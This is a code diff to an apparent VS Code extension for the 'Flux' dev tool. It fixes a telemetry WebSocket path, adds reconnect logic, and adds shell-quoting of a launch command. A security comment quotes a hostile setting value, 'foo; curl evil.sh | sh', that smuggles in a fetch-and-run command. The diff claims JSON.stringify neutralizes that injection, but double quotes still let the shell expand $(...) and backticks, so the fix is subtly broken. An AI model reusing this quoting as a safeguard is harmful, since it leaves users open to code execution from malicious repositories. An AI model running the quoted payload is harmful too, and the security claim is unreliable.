@@ -50,25 +50,31 @@ function connectHotReloadStatus(port: number): void {
     return;
   }
   try {
-    const ws = new WebSocket(`ws://127.0.0.1:${port}`);
+    // Audit fix: the DevTools endpoint is `/devtools`, not `/`. The previous
+    // URL handshook against the wrong path, so the status never moved off
+    // "idle" even when the dev server was running.
+    const ws = new WebSocket(`ws://127.0.0.1:${port}/devtools`);
     telemetrySocket = ws;
     ws.on("open", () => setStatus("connected", "Dev server telemetry connected"));
-    ws.on("message", (data: RawData) => {
-      // Telemetry frames are MessagePack/JSON; we only need a coarse signal, so
-      // treat any inbound frame as "reloaded" and reset to "compiling" on close.
-      const text = data.toString();
-      if (text.includes("reload") || text.includes("Reload")) {
-        setStatus("reloaded", "Hot reload applied");
-      } else {
-        setStatus("compiling", "Dev server compiling…");
-      }
+    ws.on("message", (_data: RawData) => {
+      // Telemetry frames are MessagePack/JSON binary blobs; we do not decode
+      // them here. Any inbound frame means the dev server is actively
+      // shipping patches — that is exactly the "hot reload applied" signal we
+      // surface. The previous `text.includes("reload")` heuristic decoded
+      // binary as UTF-8 and could never match.
+      setStatus("reloaded", "Hot reload applied");
     });
     ws.on("close", () => {
       telemetrySocket = undefined;
       setStatus("idle", "Dev server not connected");
+      // Audit fix: the socket is best-effort, but a transport hiccup (dev
+      // server restart, transient TCP drop) should not permanently disable
+      // the status bar. Retry with a fixed backoff.
+      setTimeout(() => connectHotReloadStatus(port), 3_000);
     });
     ws.on("error", () => {
-      // Non-fatal: dev server may not be running.
+      // Non-fatal: dev server may not be running. The `close` handler above
+      // schedules the retry, so nothing more to do here.
       telemetrySocket = undefined;
       setStatus("idle", "Dev server not connected");
     });
@@ -91,7 +97,11 @@ async function runOnDevice(): Promise<void> {
   const devBin = fluxBin.replace(/flux-lsp$/, "flux") || "flux";
   output.appendLine("Launching `flux dev --ws-host 0.0.0.0`…");
   const term = vscode.window.createTerminal({ name: "Flux dev (device)" });
-  term.sendText(`${devBin} dev --ws-host 0.0.0.0`);
+  // SECURITY: `devBin` comes from a per-workspace setting that a malicious
+  // repository could set to `foo; curl evil.sh | sh`. `JSON.stringify` wraps
+  // it in double quotes (escaping any embedded quotes/backslashes), so a shell
+  // injection through the setting is neutralized.
+  term.sendText(`${JSON.stringify(devBin)} dev --ws-host 0.0.0.0`);
   term.show();
   output.appendLine(
     "Dev server exposing on 0.0.0.0. On the device, point the Flux app at this machine's LAN IP on :7331.",
